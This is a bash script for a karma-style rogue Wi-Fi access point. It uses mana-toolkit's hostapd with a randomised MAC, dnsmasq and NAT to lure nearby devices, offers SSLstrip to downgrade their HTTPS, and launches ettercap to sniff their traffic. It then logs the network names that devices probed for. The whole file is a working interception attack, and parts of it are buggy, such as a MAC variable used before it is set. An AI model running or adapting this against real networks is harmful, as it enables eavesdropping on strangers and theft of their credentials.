#!/bin/bash
# Author: MaMe82


# The interface used for providing the hotspot
SCRIPTPATH="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd)"

source $SCRIPTPATH/setup.conf
NOW=$(date +"%F_%H_%M")
LOGPREFIX=$LOGDIR/${NOW}_

echo "Logging to $LOGPREFIX"

# path to karma-capable hostapd (from mana-toolkit)
hostapd=/usr/lib/mana-toolkit/hostapd

# delete TmpWorkDir if existent an recreate
rm -R ${TMPWORKDIR} 1>&2> /dev/null
mkdir -p ${TMPWORKDIR}
# copy certs to temporary path
cp -R  ${SCRIPTPATH}/cert ${TMPWORKDIR}/cert

#build conf files
source $SCRIPTPATH/build_hostapd_conf
source $SCRIPTPATH/build_dhcpd_conf

#Create log-dir if no existent
if [[ ! -e $LOGDIR ]]; then
	mkdir -p $LOGDIR
fi


function correct_hosts
{
	if $(cat /etc/hosts | grep -q $(hostname))
	then
		echo "/etc/hosts correct"
	else
		echo "/etc/hosts not correct, fixing ..."
		echo 127.0.0.1 `hostname` >> /etc/hosts
	fi
}


function add_unmanaged_mac()
{
        nwmconf="/etc/NetworkManager/NetworkManager.conf"
        unmanaged_mac=$1

        changed=false
        echo "Exclude WLAN interface with MAC $unmanaged_mac from NetworkManager configuration ..."
        sed -i -e 's/plugins=.*/plugins=ifupdown,keyfile/' $nwmconf

        # check if keyfile section is present, add otherwise
        if grep -q -E '^\[keyfile\]' $nwmconf; then
                echo "... [keyfile] section present in $nwmconf"
        else
                echo "... [keyfile] section missing in $nwmconf, adding it"
                echo >> $nwmconf
                echo "[keyfile]" >> $nwmconf
                changed=true
        fi

        # check if exlude entry for our MAC is present, add it otherwise
        # ToDo: it isn't checked if a matching entry belongs to [keyfile] section (but could be assumed)
        if grep -q -E "^unmanaged-devices=$unmanaged_mac" $nwmconf; then
                echo "... unmanaged-device entry present for $unmanaged_mac"
        else
                echo "... unmanaged-device entry missing for $unmanaged_mac, adding it"
                sed -i -e "s/\[keyfile\]/&\nunmanaged-devices=$unmanaged_mac/" $nwmconf
                changed=true
        fi

        #echo "Changed $changed"
        if $changed; then return 0; else return 1; fi
}


echo "Checking if MAC address of hotspot interface is excluded from NetworkManager config"
if add_unmanaged_mac $interface_hotspot_mac; then
        echo "Configuration of NetworkManager has been changed, restarting"
	service network-manager restart
fi


function getMACAddr()
{
	ip link show $1 | grep link | awk '{print $2}'
}

interface_hotspot_mac=$(getMACAddr $interface_hotspot)
echo "Hotspot IF MAC: $interface_hotspot_mac"


function disable_network_manager()
{
	echo
}



function start_in_new_terminal
{
	if [ $use_nethunter == true ]; then
		echo "======================================================"
		echo "issue the following command in new Terminal"
		echo $@
		echo "======================================================"
	else
		gnome-terminal -e "${@}" 2> /dev/null
	fi
	#echo $@
}



function ask_for_sslstrip
{
  option=0

  read -p "Run SSLSTRIP (y/n) default (n): " option
  


  case $option in
	Yes|yes|Y|y ) ENABLE_SSLSTRIP=true;echo "Enable SSLStrip";;
	No|no|N|n|* ) ENABLE_SSLSTRIP=false;echo "Disable SSLStrip";;
	
  esac
  
  if [ "$ENABLE_SSLSTRIP" == true ]
  then
  echo "Remark:"
  echo "If SSLStrip is runned in conjuction with MITMPROXY"
  echo "plain http-traffic wouldn't be redirected to MITMPROXY"
  echo "and must be captured separately (e.g. ettercap, wireshark)"
  echo "MITMProxy scripts won't work for plain HTTP!!!"
  
  fi
  echo
  
 
}

function start_ettercap
{
  option=0
  read -p "Start ettercap in new terminal (y/n) default (n): " option
  


  case $option in
	
	Yes|yes|Y|y ) ETTERCAP_RUNNING=true;start_in_new_terminal "ettercap -p -u -T -q -i $interface_hotspot";;
	No|no|N|n|* ) echo "ettercap could be launched by hand";;
	
  esac
  echo ""
 
}


create_hostapd_conf ${TMPWORKDIR}/hostapd.conf
create_dhcpd_conf ${TMPWORKDIR}/dhcpd.conf

# ToDo: only needed if cp is started --> move to if
ask_for_sslstrip

correct_hosts
rfkill unblock wlan

# set random mac for Hotspot interface
echo changing interface mac
ifconfig $interface_hotspot down
macchanger -r $interface_hotspot
# configure ip for hotspot_interface
ifconfig $interface_hotspot $interface_hotspot_ip netmask $interface_hotspot_netmask up
sleep 2


# configure ip for hotspot_interface done above
# ifconfig $interface_hotspot $interface_hotspot_ip netmask $interface_hotspot_netmask

# be the gateway to the local net of the hotspot
echo "Setting up route for gateway..."
route add -net $net_hotspot netmask $interface_hotspot_netmask gw $interface_hotspot_ip


#start hostapd
echo "Starting hostapd..."

$hostapd $TMPWORKDIR/hostapd.conf > ${LOGPREFIX}hostapd.log &
sleep 5

# enable DHCP
dnsmasq -C $TMPWORKDIR/dhcpd.conf


# ToDo: Backup old routing setting
#enable routing
echo '1' > /proc/sys/net/ipv4/ip_forward
#default-policy aller chains auf accept
iptables --policy INPUT ACCEPT
iptables --policy FORWARD ACCEPT
iptables --policy OUTPUT ACCEPT

#ToDo: Backup old iptables settings
#clean iptables
iptables -t mangle -F
#iptables -t mangle -X $portal_chain
iptables -t filter -F
iptables -t nat -F

# MASQUERADING on internet-interface (replace host source-ip, by own ip)
iptables -t nat -A POSTROUTING -o $interface_upstream -j MASQUERADE



# allow DNS packets to pass the captive portal
iptables -t filter -I FORWARD -m mark --mark 99  -p udp --dport 53 -j ACCEPT




start_ettercap
echo "=============================================="
echo "Hotspot is up and running!"
echo "Hit <Enter> to kill hotspot and revert changes"
echo "=============================================="
read

###############################################
# Kill all and revert changes
#############################################

# create WLAN list from hostapd log (karma)
$SCRIPTPATH/parselog.sh ${LOGPREFIX}hostapd.log

pkill dhcpd
pkill sslstrip
pkill sslsplit
pkill hostapd
pkill python
iptables --policy INPUT ACCEPT
iptables --policy FORWARD ACCEPT
iptables --policy OUTPUT ACCEPT
iptables -t nat -F
iptables -t mangle -F

if [ "$ETTERCAP_RUNNING" == true ]
then
	echo "Killing ettercap..."
	killall ettercap
fi

#service stunnel4 stop
#service ssh stop
